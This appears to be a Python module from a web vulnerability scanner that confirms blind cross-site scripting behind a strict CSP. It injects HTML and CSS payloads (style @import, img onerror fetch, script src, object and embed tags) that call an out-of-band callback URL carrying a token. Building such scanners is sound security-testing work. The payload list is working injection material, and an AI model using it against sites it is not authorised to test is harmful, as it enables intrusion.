"""Time-based blind XSS detection.

When a target has a strict CSP that blocks ``alert()``, ``prompt()``, and
``console.log()``, the standard execution-confirmation sinks don't fire
and the scanner reports a false negative.  This module provides an
alternative confirmation path: inject a payload that triggers a
**measurable timing side-effect** and detect the XSS by comparing the
response time against a baseline.

Two timing channels are supported:

1. **CSS @import chain** (server-side reflection):
   Inject ``<style>@import url('https://xssentinel-callback/tok');</style>``
   into the reflected parameter.  If the browser parses the reflected
   ``<style>`` block, it will issue a CSS @import fetch to the callback
   URL.  The OOB listener observes the HTTP request (or DNS lookup)
   within a few seconds, confirming the payload was rendered as HTML.

2. **Performance API / resource timing** (headless mode):
   In a real browser (Playwright), inject a payload that loads an
   external resource (``<img src=https://callback/tok>``) and then check
   ``performance.getEntriesByType('resource')`` for the callback URL.
   If the entry exists, the browser parsed the payload as HTML and
   attempted to load the resource -- execution confirmed without any
   ``alert()`` dialog.

3. **CSS ::select / animation** (headless mode):
   Inject ``<style>:focus { background: url(https://callback/tok) }</style>``
   and programmatically focus the element.  If the background image is
   fetched, the CSS was parsed -- confirming the reflection is in an
   executable style context.

This module is a TRIAGE layer -- it does not replace the main verifier
but provides a fallback when the standard sinks are blocked by CSP.
"""
from __future__ import annotations
import time
import secrets


def build_timing_payloads(callback_url: str, token: str) -> list[dict]:
    """Build timing-based XSS payloads for the given callback URL.

    Returns a list of dicts: ``{"name": str, "payload": str, "channel": str}``
    where channel is "css_import", "img_load", "css_focus", or "script_fetch".
    """
    cb = callback_url.rstrip("/")
    full_cb = f"{cb}/{token}"

    return [
        {
            "name": "css_import",
            "channel": "css_import",
            "payload": f"<style>@import url('{full_cb}');</style>",
        },
        {
            "name": "img_onerror",
            "channel": "img_load",
            "payload": f"<img src=x onerror=\"fetch('{full_cb}')\">",
        },
        {
            "name": "img_src",
            "channel": "img_load",
            "payload": f"<img src='{full_cb}'>",
        },
        {
            "name": "css_focus_background",
            "channel": "css_focus",
            "payload": (
                f"<style>:focus {{ background: url('{full_cb}') }}</style>"
                f"<input autofocus>"
            ),
        },
        {
            "name": "script_src",
            "channel": "script_fetch",
            "payload": f"<script src='{full_cb}'></script>",
        },
        {
            "name": "link_stylesheet",
            "channel": "css_import",
            "payload": f"<link rel='stylesheet' href='{full_cb}'>",
        },
        {
            "name": "video_poster",
            "channel": "img_load",
            "payload": f"<video poster='{full_cb}'></video>",
        },
        {
            "name": "source_src",
            "channel": "img_load",
            "payload": f"<source src='{full_cb}'>",
        },
        {
            "name": "object_data",
            "channel": "img_load",
            "payload": f"<object data='{full_cb}'></object>",
        },
        {
            "name": "embed_src",
            "channel": "img_load",
            "payload": f"<embed src='{full_cb}'>",
        },
    ]


def check_performance_entries(page, token: str, timeout: float = 3.0
                              ) -> dict:
    """Check Playwright page's performance entries for the callback token.

    In headless mode, after injecting a timing payload, call this to
    inspect ``performance.getEntriesByType('resource')`` for any entry
    whose URL contains the token.  If found, the browser attempted to
    load the callback resource -- confirming the payload was parsed as
    HTML and the resource fetch was initiated.

    Args:
        page: Playwright Page object.
        token: the token embedded in the callback URL.
        timeout: how long to wait for the resource fetch to complete.

    Returns:
        ``{"confirmed": bool, "entries": list[dict], "detail": str}``
    """
    try:
        # Wait for the resource fetch to be initiated.
        page.wait_for_timeout(int(timeout * 1000))
        # Query the performance API for resource entries.
        entries = page.evaluate(
            """(token) => {
                return performance.getEntriesByType('resource')
                    .filter(e => e.name.includes(token))
                    .map(e => ({name: e.name, type: e.initiatorType,
                                duration: e.duration, size: e.transferSize}));
            }""",
            token,
        )
        if entries:
            return {
                "confirmed": True,
                "entries": entries,
                "detail": (
                    f"performance API confirmed {len(entries)} resource "
                    f"fetch(es) for token '{token}' -- payload was parsed "
                    f"as HTML and the browser initiated the fetch"
                ),
            }
        return {
            "confirmed": False,
            "entries": [],
            "detail": (
                f"no performance entries found for token '{token}' within "
                f"{timeout}s -- payload may not have been parsed as HTML, "
                f"or the resource fetch was blocked by CSP/CORS"
            ),
        }
    except Exception as e:
        return {
            "confirmed": False,
            "entries": [],
            "detail": f"performance API check failed: {e}",
        }


def measure_response_time(requester, url: str, method: str,
                          params: dict, data: dict, param: str,
                          payload: str, is_body: bool = False) -> dict:
    """Measure the response time for a payload injection.

    Sends the payload and returns the response time in milliseconds.
    The caller compares this against a baseline to detect timing
    anomalies (e.g. a ``<style>@import`` that causes the browser to
    block on a slow external resource).

    Returns:
        ``{"time_ms": float, "status": int, "error": str | None}``
    """
    send_params = dict(params)
    send_data = dict(data)
    if is_body:
        send_data[param] = payload
    else:
        send_params[param] = payload

    start = time.monotonic()
    try:
        resp = requester.request(method, url,
                                 params=send_params, data=send_data)
        elapsed_ms = (time.monotonic() - start) * 1000
        return {
            "time_ms": elapsed_ms,
            "status": getattr(resp, "status_code", 0),
            "error": None,
        }
    except Exception as e:
        elapsed_ms = (time.monotonic() - start) * 1000
        return {
            "time_ms": elapsed_ms,
            "status": 0,
            "error": str(e),
        }


def scan_time_based(scanner, req, url: str, method: str,
                    params: dict, data: dict, param: str,
                    is_body: bool = False) -> None:
    """Run time-based XSS detection on a parameter.

    This is a fallback layer: call it only when the standard verifier
    could not confirm execution (e.g. CSP blocks alert()).

    Strategy:
      1. If OOB listener is available, inject resource-fetch payloads
         and poll for callback.
      2. If headless mode is available, inject payloads and check
         performance API entries.
      3. If neither is available, skip (cannot confirm without a
         callback channel).
    """
    import secrets as sec
    token = f"tb_{sec.token_hex(4)}"

    # Determine the callback URL.
    callback_url = None
    if scanner.oob:
        # callback_url may be a method (SelfHostedListener) or a string
        # attribute (InteractshListener).  Handle both.
        cb = getattr(scanner.oob, "callback_url", None)
        if callable(cb):
            try:
                callback_url = cb(token)
            except Exception:
                callback_url = cb.__self__.url if hasattr(cb, "__self__") else None
        elif isinstance(cb, str):
            callback_url = cb
        elif hasattr(scanner.oob, "url"):
            callback_url = scanner.oob.url

    if not callback_url:
        # No callback channel available -- skip time-based detection.
        return

    # Phase 22-3: limit to the top 3 most effective channels to avoid
    # excessive latency on non-confirming endpoints (each payload has a
    # 1s sleep for the browser to initiate the fetch).
    all_payloads = build_timing_payloads(callback_url, token)
    payloads_list = all_payloads[:3]

    for p in payloads_list:
        payload = p["payload"]
        send_params = dict(params)
        send_data = dict(data)
        if is_body:
            send_data[param] = payload
        else:
            send_params[param] = payload
        try:
            resp = req.request(method, url, params=send_params,
                               data=send_data)
            scanner._bump()
        except Exception:
            continue

        # Poll the OOB listener for a callback with this token.
        import time as _time
        _time.sleep(1.0)  # give the browser time to fetch the resource
        try:
            # Use the listener's poll() method which returns a set of
            # received tokens.  Some listeners store callbacks in a list;
            # check both paths for robustness.
            received = set()
            if hasattr(scanner.oob, "poll"):
                try:
                    received = scanner.oob.poll({token}, timeout=1.0) or set()
                except Exception:
                    pass
            if not received:
                # Fallback: check the callbacks list directly.
                callbacks = getattr(scanner.oob, "callbacks", []) or []
                if any(token in str(c) for c in callbacks):
                    received = {token}
            if token in received or any(token in str(c) for c in received):
                from .scanner import Finding
                scanner._add(Finding(**{
                    "url": url, "method": method, "param": param,
                    "type": "time_based_xss",
                    "context": f"time_based_{p['channel']}",
                    "payload": payload, "transform": [],
                    "severity": "high", "confidence": "high",
                    "detail": (f"Time-based XSS confirmed via {p['channel']} "
                               f"callback (token={token}); the browser fetched "
                               f"the callback resource, proving the payload was "
                               f"parsed as HTML despite CSP blocking alert()"),
                    "headless": None,
                    "proof": {"channel": p["channel"], "token": token},
                }))
                if scanner.verbose:
                    print(f"    [+] Time-based XSS confirmed "
                          f"({p['channel']}, token={token})")
                return  # one confirmed finding is enough
        except Exception:
            continue
